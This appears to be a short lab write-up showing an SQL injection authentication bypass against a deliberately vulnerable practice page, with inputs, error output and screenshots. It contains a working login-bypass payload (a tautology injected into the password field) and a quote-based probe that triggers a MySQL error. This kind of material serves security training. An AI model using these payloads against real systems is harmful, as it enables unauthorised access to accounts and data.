# Authentication Bypass [SQL Injection]

Target: http://**IP**/SQL-Injection/Authentication-Bypass-Variant-1/

<img src="./Initial.PNG">

**Input:** <br>
username: admin' <br>
password: pass

**Output:** <br>
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'pass'' at line 1

<br>

<img src="./SQL syntax Error-1.PNG"> <br>

**Input:** <br>
username: admin <br>
password: pass' or 1=1 --+

**Output:** <br>
Logged In Successfully 

<img src="./Auth bypass success.PNG"> <br>

